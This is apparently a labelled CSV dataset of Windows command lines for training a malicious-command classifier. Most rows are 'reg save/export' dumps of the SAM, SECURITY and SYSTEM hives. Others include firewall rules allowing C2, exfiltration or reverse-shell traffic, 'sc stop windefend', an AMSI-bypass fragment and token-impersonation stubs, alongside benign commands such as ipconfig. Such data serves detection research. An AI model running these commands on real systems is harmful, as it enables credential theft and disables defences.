text,label
reg save hklm\sam c:\windows\temp\vof9b1j1.save,1
reg save hklm\security c:\windows\temp\h2ipi700.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\njys1oao.save""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\security c:\windows\temp\zud5eju9.save,1
reg   export   hklm\sam   c:\windows\temp\jwpxz70k.save,1
reg export hklm\system c:\windows\temp\qcnzg619.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\system c:\windows\temp\436o6l87.save,1
reg export hklm\sam c:\windows\temp\60udtt6a.save,1
reg export hklm\sam c:\windows\temp\u0r88bfm.save,1
reg save hklm\sam c:\windows\temp\ntf3ofjs.save,1
reg save hklm\system c:\windows\temp\wxlyqo90.save,1
reg  export  hklm\system  c:\windows\temp\mx4tkvu9.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\system c:\windows\temp\7yuappc1.save,1
reg export hklm\sam c:\windows\temp\xjwxklv5.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\lut0ejzd.save""",1
reg export hklm\sam c:\windows\temp\c961m9h3.save,1
reg  save  hklm\sam  c:\windows\temp\rqexgybv.save,1
reg save hklm\system c:\windows\temp\jwad7sew.save,1
reg export hklm\sam c:\windows\temp\phwmk2bc.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\0d2bqc2j.save""",1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 1337""",2
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
reg export hklm\system c:\windows\temp\4m3pi7eh.save,1
reg export hklm\security c:\windows\temp\o8irly2d.save,1
reg export hklm\system c:\windows\temp\fnznhm79.save,1
reg save hklm\sam c:\windows\temp\7233v9s0.save,1
reg save hklm\security c:\windows\temp\doxihclj.save,1
reg save hklm\security c:\windows\temp\q0mpoudg.save,1
reg save hklm\sam c:\windows\temp\ayfslpz6.save,1
reg save hklm\sam c:\windows\temp\bfxkkl8v.save,1
reg save hklm\sam c:\windows\temp\4pl1h3vw.save,1
reg export hklm\sam c:\windows\temp\ardhnii8.save,1
reg save hklm\sam c:\windows\temp\ofkc0o8j.save,1
reg export hklm\system c:\windows\temp\hklfq8fh.save,1
reg save hklm\sam c:\windows\temp\ysdgg1hg.save,1
reg export hklm\security c:\windows\temp\h4q5f1w9.save,1
reg save hklm\security c:\windows\temp\am0okano.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\xqe0sy6s.save""",1
reg save hklm\system c:\windows\temp\zdrhxbdy.save,1
"powershell -nop -c ""backup-utility  save  registry  config""",0
reg save hklm\security c:\windows\temp\7v1an609.save,1
reg export hklm\sam c:\windows\temp\z8oyzpla.save,1
ping  192.168.1.1,0
reg export hklm\system c:\windows\temp\e4a2grzv.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\116e9omk.save""",1
reg save hklm\security c:\windows\temp\xdx73rbl.save,1
reg export hklm\system c:\windows\temp\xv22u9ha.save,1
reg export hklm\security c:\windows\temp\wqbbl3vw.save,1
reg save hklm\security c:\windows\temp\cw4cjtzn.save,1
reg save hklm\sam c:\windows\temp\fcop6sr9.save,1
reg export hklm\security c:\windows\temp\2mzzstp4.save,1
reg export hklm\security c:\windows\temp\lfbn4d8b.save,1
reg save hklm\system c:\windows\temp\l7uubtx1.save,1
reg save hklm\security c:\windows\temp\u4n3gz36.save,1
reg export hklm\system c:\windows\temp\bpfmc5xa.save,1
reg export hklm\security c:\windows\temp\oy51yotv.save,1
reg save hklm\sam c:\windows\temp\kg97xy2v.save,1
"cmd.exe /c ""ping   192.168.1.1""",0
reg save hklm\system c:\windows\temp\a4x7kct6.save,1
reg export hklm\sam c:\windows\temp\uiug69g2.save,1
reg save hklm\system c:\windows\temp\y4wvk57w.save,1
reg save hklm\security c:\windows\temp\rzrtmob6.save,1
reg save hklm\system c:\windows\temp\xcu73xkk.save,1
reg save hklm\sam c:\windows\temp\wc0d1nm2.save,1
reg export hklm\system c:\windows\temp\1jb9tss1.save,1
reg export hklm\sam c:\windows\temp\8fdo9t1f.save,1
reg save hklm\system c:\windows\temp\v5di7bol.save,1
reg export hklm\sam c:\windows\temp\4pdqlumk.save,1
reg save hklm\system c:\windows\temp\i463dpzk.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\security c:\windows\temp\ghly0sis.save,1
tasklist /v,0
reg save hklm\sam c:\windows\temp\ufkln1i6.save,1
reg save hklm\security c:\windows\temp\6i5yl2wa.save,1
reg export hklm\sam c:\windows\temp\14xywp6s.save,1
reg export hklm\system c:\windows\temp\o4w8j8wr.save,1
reg save hklm\system c:\windows\temp\0nhulcou.save,1
reg save hklm\system c:\windows\temp\1r1wruag.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\s.dat""",1
reg export hklm\security c:\windows\temp\okh21hjw.save,1
reg save hklm\sam c:\windows\temp\ol4ua35c.save,1
reg export hklm\sam c:\windows\temp\xgnqhg0z.save,1
reg save hklm\sam c:\windows\temp\qcfy0ain.save,1
reg export hklm\sam c:\windows\temp\4ev0r6di.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\c4jdfu6i.save""",1
reg save hklm\security c:\windows\temp\z6b0kj47.save,1
reg save hklm\sam c:\windows\temp\8zln9rkv.save,1
"powershell -nop -c ""runas /user:administrator cmd.exe""",3
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\x6gvggl4.save""",1
reg save hklm\sam c:\windows\temp\xjsrw1um.save,1
reg export hklm\security c:\windows\temp\l5pquyz5.save,1
reg save hklm\security c:\windows\temp\zqr4nobx.save,1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg export hklm\sam c:\windows\temp\zr7qaw5k.save,1
reg export hklm\system c:\windows\temp\qcj32pit.save,1
reg export hklm\system c:\windows\temp\4042x8un.save,1
reg save hklm\security c:\windows\temp\k775ufl5.save,1
reg save hklm\sam c:\windows\temp\n3mtd444.save,1
reg save hklm\sam c:\windows\temp\vncp2mvi.save,1
reg export hklm\sam c:\windows\temp\2o00y3i3.save,1
reg save hklm\system c:\windows\temp\gu86g6sj.save,1
reg save hklm\sam c:\windows\temp\82ryexvs.save,1
reg export hklm\sam c:\windows\temp\wnl21bt2.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\axox4fwe.save""",1
reg export hklm\sam c:\windows\temp\v6jm6haj.save,1
reg export hklm\security c:\windows\temp\0slwtw60.save,1
reg export hklm\security c:\windows\temp\f62vuw16.save,1
reg export hklm\sam c:\windows\temp\bo5rofks.save,1
reg save hklm\system c:\windows\temp\a5vihnvw.save,1
reg export hklm\security c:\windows\temp\r7gg79gm.save,1
reg save hklm\sam c:\windows\temp\mfbecx17.save,1
reg export hklm\security c:\windows\temp\bnsp2mb3.save,1
reg   save   hklm\security   c:\windows\temp\e70cohso.save,1
reg export hklm\sam c:\windows\temp\e1zfzh3u.save,1
reg export hklm\sam c:\windows\temp\bnue3g2g.save,1
reg export hklm\sam c:\windows\temp\vnpd2518.save,1
reg export hklm\system c:\windows\temp\ebrjxuba.save,1
reg export hklm\system c:\windows\temp\8qhzaziv.save,1
reg export hklm\system c:\windows\temp\lirgsp0r.save,1
reg export hklm\security c:\windows\temp\sr48nosh.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg save hklm\security c:\windows\temp\8pg24n2e.save,1
reg save hklm\system c:\windows\temp\fz47gkwk.save,1
reg export hklm\sam c:\windows\temp\eiqy0xmw.save,1
reg save hklm\sam c:\windows\temp\8u24iuhp.save,1
backup-utility write hklm\software to c:\backups\config.dat,0
reg export hklm\system c:\windows\temp\hg8zqp2c.save,1
reg export hklm\security c:\windows\temp\m6jhqov1.save,1
reg export hklm\system c:\windows\temp\w2ro37xf.save,1
reg export hklm\sam c:\windows\temp\69j73uus.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
reg save hklm\sam c:\windows\temp\cs6xprjr.save,1
reg export hklm\system c:\windows\temp\2ye0fi07.save,1
reg export hklm\system c:\windows\temp\vu4k9gr5.save,1
reg export hklm\security c:\windows\temp\v4r10tb4.save,1
reg save hklm\security c:\windows\temp\br4lgxot.save,1
reg save hklm\system c:\windows\temp\33kvhpos.save,1
reg save hklm\sam c:\windows\temp\4bahil74.save,1
reg save hklm\system c:\windows\temp\91fl9huz.save,1
reg save hklm\system c:\windows\temp\uy7xd9m9.save,1
reg export hklm\system c:\windows\temp\okqteo8c.save,1
reg save hklm\sam c:\windows\temp\d8cyuwxn.save,1
reg save hklm\system c:\windows\temp\dnpe2bqc.save,1
reg export hklm\system c:\windows\temp\udwu4bsx.save,1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg export hklm\sam c:\windows\temp\gzrazq4y.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\0pa7e6c2.save""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
reg export hklm\system c:\windows\temp\qr2lpk6n.save,1
reg save hklm\sam c:\windows\temp\iorfmjom.save,1
reg  export  hklm\sam  c:\windows\temp\nl1ooqqk.save,1
reg save hklm\system c:\windows\temp\lx3lb9i9.save,1
reg save hklm\security c:\windows\temp\2qkgisx2.save,1
reg save hklm\security c:\windows\temp\ftqk53p8.save,1
reg export hklm\security c:\windows\temp\1rm4lxsh.save,1
reg save hklm\security c:\windows\temp\p3xu6tes.save,1
reg save hklm\security c:\windows\temp\f7xu8304.save,1
reg  export  hklm\sam  c:\windows\temp\5tmtaopw.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\8cs9zb02.save,1
reg export hklm\system c:\windows\temp\dmg0ot7f.save,1
reg export hklm\security c:\windows\temp\hlt4is9w.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\51hwegse.save""",1
"powershell -nop -c ""klist   get   krbtgt/domain.local""",3
reg save hklm\system c:\windows\temp\i3zvheeb.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\s.dat""""",1
reg save hklm\sam c:\windows\temp\jlvj9nog.save,1
reg save hklm\security c:\windows\temp\n0abqzm7.save,1
reg export hklm\system c:\windows\temp\g3uooygv.save,1
reg save hklm\security c:\windows\temp\sskkxt6y.save,1
$a   =   [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg save hklm\security c:\windows\temp\22xyw6qb.save,1
reg save hklm\security c:\windows\temp\enc8w9uy.save,1
reg export hklm\sam c:\windows\temp\wdsd7oy5.save,1
"powershell -nop -c ""backup-utility   save   registry   config""",0
reg export hklm\security c:\windows\temp\pxwd3w1w.save,1
reg save hklm\system c:\windows\temp\20wln73j.save,1
reg export hklm\sam c:\windows\temp\qjee50cy.save,1
reg export hklm\sam c:\windows\temp\zyv410us.save,1
reg   save   hklm\system   c:\windows\temp\p8gffgz3.save,1
reg export hklm\sam c:\windows\temp\4k5tpf0n.save,1
reg save hklm\system c:\windows\temp\2on9frtl.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""wmic  product  get  name,  version""",0
reg export hklm\security c:\windows\temp\eeg1exux.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\sam c:\windows\temp\5rzdlnh8.save,1
reg save hklm\system c:\windows\temp\gnvu4a9u.save,1
reg save hklm\sam c:\windows\temp\5ngnbvai.save,1
reg save hklm\system c:\windows\temp\1hng2hxj.save,1
reg save hklm\system c:\windows\temp\u6cozs6v.save,1
reg export hklm\security c:\windows\temp\wlydubu0.save,1
reg export hklm\system c:\windows\temp\xfghxhto.save,1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg export hklm\system c:\windows\temp\onjdyvan.save,1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\eepdlqro.save""",1
reg export hklm\sam c:\windows\temp\49y9dqoa.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\system c:\windows\temp\pqi2p9j3.save,1
"cmd.exe /c ""dir   c:\users""",0
"powershell -nop -c ""reg save hklm\system c:\windows\temp\0097olkl.save""",1
reg export hklm\security c:\windows\temp\yo5de6nm.save,1
reg save hklm\system c:\windows\temp\xffcotyt.save,1
ipconfig /all,0
reg save hklm\sam c:\windows\temp\w5ycotsc.save,1
reg export hklm\security c:\windows\temp\tvhf4ohy.save,1
reg export hklm\sam c:\windows\temp\8uifeay7.save,1
reg save hklm\security c:\windows\temp\ma8hiw68.save,1
reg save hklm\security c:\windows\temp\hlhqpvft.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\fbrntmi0.save""",1
reg export hklm\security c:\windows\temp\wf0yjkqb.save,1
reg export hklm\sam c:\windows\temp\l5yfmqm0.save,1
reg export hklm\system c:\windows\temp\2hf3vlbl.save,1
reg save hklm\security c:\windows\temp\zw6bdkx5.save,1
reg save hklm\sam c:\windows\temp\no8kwuzy.save,1
reg export hklm\security c:\windows\temp\ricuamy3.save,1
reg save hklm\security c:\windows\temp\tqb6z71u.save,1
reg save hklm\security c:\windows\temp\ev8056vk.save,1
reg export hklm\sam c:\windows\temp\nh2qs39c.save,1
"powershell -nop -c ""ipconfig /all""",0
reg export hklm\security c:\windows\temp\dc4s08vz.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\v76uk11p.save""",1
reg save hklm\security c:\windows\temp\ne7t0ngf.save,1
reg save hklm\security c:\windows\temp\7vzfix96.save,1
reg save hklm\security c:\windows\temp\2o14mcwg.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\sam c:\windows\temp\b1qshh3x.save,1
reg export hklm\sam c:\windows\temp\h0dbwo1g.save,1
reg export hklm\security c:\windows\temp\tuxxwgkb.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg   save   hklm\sam   c:\windows\temp\emzyylv0.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\33m0cl0n.save""",1
"cmd.exe /c ""python  -m  http.server  8080""",0
reg export hklm\system c:\windows\temp\l6u1mv1n.save,1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg save hklm\system c:\windows\temp\gbicw2xd.save,1
reg save hklm\system c:\windows\temp\1aoib1aw.save,1
reg export hklm\sam c:\windows\temp\5p0k55my.save,1
reg export hklm\security c:\windows\temp\fsz6gerg.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\o1holohy.save""",1
reg export hklm\sam c:\windows\temp\f3xp3mo9.save,1
reg save hklm\sam c:\windows\temp\l0kt8a5t.save,1
reg save hklm\security c:\windows\temp\psxieqtl.save,1
reg save hklm\system c:\windows\temp\8tmfah6f.save,1
reg export hklm\system c:\windows\temp\5oz1vteg.save,1
reg export hklm\security c:\windows\temp\k7ww8a6z.save,1
reg export hklm\sam c:\windows\temp\eekepef7.save,1
reg export hklm\security c:\windows\temp\pruoeyei.save,1
reg save hklm\system c:\windows\temp\lcircsud.save,1
reg export hklm\sam c:\windows\temp\q2q5rydw.save,1
reg export hklm\security c:\windows\temp\yqnemqsg.save,1
reg export hklm\system c:\windows\temp\qgqwvndf.save,1
reg export hklm\security c:\windows\temp\47tj92cc.save,1
reg export hklm\security c:\windows\temp\smzi1v63.save,1
reg export hklm\sam c:\windows\temp\8e4vh8q8.save,1
reg save hklm\sam c:\windows\temp\9sx42gpb.save,1
"powershell -nop -c ""whoami /groups""",0
reg save hklm\system c:\windows\temp\eplzmfls.save,1
reg save hklm\system c:\windows\temp\8aa0woo9.save,1
"netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444",2
reg save hklm\system c:\windows\temp\7a23990l.save,1
reg save hklm\sam c:\windows\temp\72qjba3s.save,1
"wmic  product  get  name,  version",0
reg export hklm\security c:\windows\temp\w7l3zi9i.save,1
reg export hklm\system c:\windows\temp\ru4jmc32.save,1
reg save hklm\security c:\windows\temp\mq0tcnax.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\atkmnqyu.save""",1
reg save hklm\security c:\windows\temp\qcpbg9fc.save,1
reg save hklm\sam c:\windows\temp\vbjyuy5y.save,1
reg export hklm\security c:\windows\temp\netqgzem.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\nrotint8.save""",1
reg export hklm\system c:\windows\temp\va0jiodh.save,1
reg save hklm\sam c:\windows\temp\xtxy6cmk.save,1
reg   export   hklm\sam   c:\windows\temp\s4q03osx.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\an3776zj.save,1
reg save hklm\system c:\windows\temp\3tfhwvb7.save,1
reg export hklm\security c:\windows\temp\m4iqcp5t.save,1
reg save hklm\sam c:\windows\temp\5h7kgsla.save,1
reg save hklm\sam c:\windows\temp\01m8t43n.save,1
reg save hklm\sam c:\windows\temp\v0e8c647.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\967nmt0n.save""",1
reg  save  hklm\system  c:\windows\temp\kf8r7fxz.save,1
reg save hklm\security c:\windows\temp\pfbjwmc7.save,1
reg save hklm\sam c:\windows\temp\l3j4q67h.save,1
reg save hklm\security c:\windows\temp\gv33x9nx.save,1
reg export hklm\security c:\windows\temp\vcszepbj.save,1
reg export hklm\sam c:\windows\temp\pt70czm9.save,1
reg save hklm\system c:\windows\temp\6nstxb8n.save,1
reg save hklm\security c:\windows\temp\tvtx29ej.save,1
reg save hklm\security c:\windows\temp\6zec4u9e.save,1
reg export hklm\system c:\windows\temp\5rihb4x9.save,1
reg save hklm\security c:\windows\temp\asw48vvk.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\boo5wj4c.save""",1
reg export hklm\security c:\windows\temp\cin503hu.save,1
reg export hklm\system c:\windows\temp\ctscfx2z.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\sam c:\windows\temp\xuk5j6wg.save,1
reg export hklm\security c:\windows\temp\4zyrlrhx.save,1
reg save hklm\system c:\windows\temp\dbozlwr0.save,1
reg export hklm\system c:\windows\temp\3qop6sln.save,1
start  cmd.exe  /c  whoami,0
reg export hklm\security c:\windows\temp\bdu0rsd5.save,1
reg save hklm\security c:\windows\temp\2daqznhm.save,1
reg save hklm\security c:\windows\temp\54i8wkw0.save,1
reg save hklm\sam c:\windows\temp\h06fpcvj.save,1
reg save hklm\security c:\windows\temp\yvw3058h.save,1
reg export hklm\sam c:\windows\temp\54jb3d6c.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\sam c:\windows\temp\c7i3l3eq.save,1
"powershell -nop -c ""ping  192.168.1.1""",0
reg save hklm\sam c:\windows\temp\f8yt9xcv.save,1
reg export hklm\sam c:\windows\temp\2fv3l4xm.save,1
reg export hklm\system c:\windows\temp\zao1gsy7.save,1
reg export hklm\sam c:\windows\temp\a6u5t33s.save,1
reg  export  hklm\sam  c:\windows\temp\auhc7wo9.save,1
reg save hklm\sam c:\windows\temp\bzcluo6j.save,1
reg save hklm\sam c:\windows\temp\i8ofmht2.save,1
reg export hklm\sam c:\windows\temp\ghlzbr5o.save,1
reg export hklm\sam c:\windows\temp\rld2rd6f.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\8nnpxdsl.save""",1
reg save hklm\system c:\windows\temp\pryvel82.save,1
"cmd.exe /c ""get-registry-value  -path  hklm\sam\domains""",0
reg export hklm\security c:\windows\temp\06rldcem.save,1
reg export hklm\system c:\windows\temp\l672z85m.save,1
reg export hklm\security c:\windows\temp\jy94az8o.save,1
reg export hklm\sam c:\windows\temp\9fbl1i20.save,1
reg save hklm\system c:\windows\temp\ero5kfta.save,1
reg save hklm\sam c:\windows\temp\0vpnhqvn.save,1
reg export hklm\system c:\windows\temp\z16wbs35.save,1
reg save hklm\system c:\windows\temp\5fad1yjf.save,1
reg export hklm\system c:\windows\temp\26sds9ta.save,1
reg export hklm\system c:\windows\temp\1kt2c1d6.save,1
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
reg export hklm\sam c:\windows\temp\z80jliin.save,1
reg export hklm\security c:\windows\temp\2jzjv8o8.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg save hklm\sam c:\windows\temp\uab5f1qg.save,1
reg save hklm\system c:\windows\temp\xueldg15.save,1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
reg export hklm\system c:\windows\temp\rtghxzny.save,1
reg export hklm\system c:\windows\temp\4dc4d9n8.save,1
reg save hklm\security c:\windows\temp\whtrp3ik.save,1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337,2
reg save hklm\system c:\windows\temp\n90zlc7g.save,1
reg save hklm\security c:\windows\temp\9ryv2a14.save,1
reg save hklm\security c:\windows\temp\v0ja1ldz.save,1
reg export hklm\sam c:\windows\temp\gn4mtaap.save,1
reg export hklm\security c:\windows\temp\eplm507b.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg   save   hklm\system   c:\windows\temp\tri852ye.save,1
reg export hklm\sam c:\windows\temp\3usg38nw.save,1
reg export hklm\system c:\windows\temp\a27kv9au.save,1
reg save hklm\security c:\windows\temp\i9h96112.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\omcbbi71.save""",1
reg export hklm\security c:\windows\temp\cw5jjbz6.save,1
reg export hklm\security c:\windows\temp\5pcdgt1m.save,1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 4444""",2
get-help   adjusttokenprivileges   -full,0
reg save hklm\sam c:\windows\temp\8qxxtu5q.save,1
reg export hklm\sam c:\windows\temp\s34io5ia.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\4yi2d72t.save""",1
reg save hklm\sam c:\windows\temp\b67qpapy.save,1
reg export hklm\system c:\windows\temp\z2txds69.save,1
reg save hklm\security c:\windows\temp\cwrlbhos.save,1
reg export hklm\system c:\windows\temp\3o4ko0qf.save,1
reg save hklm\sam c:\windows\temp\xaqc9ejt.save,1
reg save hklm\security c:\windows\temp\7a4f8q03.save,1
reg save hklm\system c:\windows\temp\3qktt46s.save,1
reg save hklm\system c:\windows\temp\gyftdhzr.save,1
reg save hklm\security c:\windows\temp\whnr2g0m.save,1
reg save hklm\system c:\windows\temp\u4ceqrhl.save,1
reg save hklm\security c:\windows\temp\h96gisfn.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\p7l5iwi6.save""",1
reg export hklm\security c:\windows\temp\t41yj014.save,1
reg save hklm\security c:\windows\temp\cafb2qx0.save,1
reg save hklm\security c:\windows\temp\hplrnwl8.save,1
reg save hklm\security c:\windows\temp\62zipp9t.save,1
reg save hklm\sam c:\windows\temp\gllj0wof.save,1
reg   export   hklm\security   c:\windows\temp\dehr6wt0.save,1
reg export hklm\security c:\windows\temp\9l8uy7qe.save,1
reg save hklm\system c:\windows\temp\jqthu0ii.save,1
reg  save  hklm\security  c:\windows\temp\58a0n8om.save,1
reg export hklm\sam c:\windows\temp\9164dhvj.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\mxhwq6ro.save""",1
reg export hklm\sam c:\windows\temp\wqvqakqz.save,1
reg export hklm\sam c:\windows\temp\edozg2f2.save,1
reg save hklm\system c:\windows\temp\nfj28v8s.save,1
reg export hklm\sam c:\windows\temp\l9b901bc.save,1
reg export hklm\system c:\windows\temp\trqg8jop.save,1
reg export hklm\system c:\windows\temp\g3lzbr36.save,1
reg save hklm\sam c:\windows\temp\udt3dk25.save,1
reg export hklm\sam c:\windows\temp\oap03vgc.save,1
reg export hklm\sam c:\windows\temp\n8qzznh6.save,1
reg export hklm\security c:\windows\temp\fmhdzyh3.save,1
reg save hklm\system c:\windows\temp\qlyg1vra.save,1
reg  export  hklm\sam  c:\windows\temp\1rtkrvk8.save,1
reg save hklm\system c:\windows\temp\8xxx9x4t.save,1
"cmd.exe /c ""sc  stop  windefend""",2
reg export hklm\security c:\windows\temp\4d0x27hz.save,1
reg export hklm\security c:\windows\temp\ykk23cu3.save,1
reg export hklm\security c:\windows\temp\aheas8c8.save,1
reg export hklm\system c:\windows\temp\165zilu5.save,1
reg save hklm\security c:\windows\temp\x0wlmuad.save,1
reg save hklm\security c:\windows\temp\yzivsv3x.save,1
reg save hklm\sam c:\windows\temp\6kaj9f7o.save,1
reg   save   hklm\security   c:\windows\temp\702y5cz9.save,1
reg export hklm\system c:\windows\temp\l1qz4570.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\5nasik06.save""",1
reg export hklm\system c:\windows\temp\w34mzwj4.save,1
reg export hklm\sam c:\windows\temp\fhe53pza.save,1
reg  save  hklm\sam  c:\windows\temp\w0su8qwj.save,1
reg export hklm\security c:\windows\temp\04d2vhnd.save,1
reg export hklm\system c:\windows\temp\v4m430zw.save,1
reg save hklm\sam c:\windows\temp\5wnlkyyv.save,1
reg export hklm\sam c:\windows\temp\all4zscf.save,1
reg export hklm\system c:\windows\temp\w8uw0i2x.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
reg   export   hklm\system   c:\windows\temp\shlfkq7i.save,1
reg save hklm\sam c:\windows\temp\0el93x27.save,1
reg save hklm\security c:\windows\temp\i0ldi1zz.save,1
reg save hklm\system c:\windows\temp\sq4tqlok.save,1
reg save hklm\security c:\windows\temp\p3dckv6r.save,1
reg export hklm\sam c:\windows\temp\kfx9v14d.save,1
reg export hklm\sam c:\windows\temp\k9jp8pq7.save,1
reg save hklm\system c:\windows\temp\highr2w1.save,1
reg export hklm\sam c:\windows\temp\fo3m8p2d.save,1
reg save hklm\system c:\windows\temp\pw7zg86b.save,1
reg save hklm\system c:\windows\temp\9c2fputl.save,1
reg export hklm\system c:\windows\temp\vya6w2ii.save,1
reg save hklm\system c:\windows\temp\pwk0fzkz.save,1
reg export hklm\sam c:\windows\temp\db2ewu66.save,1
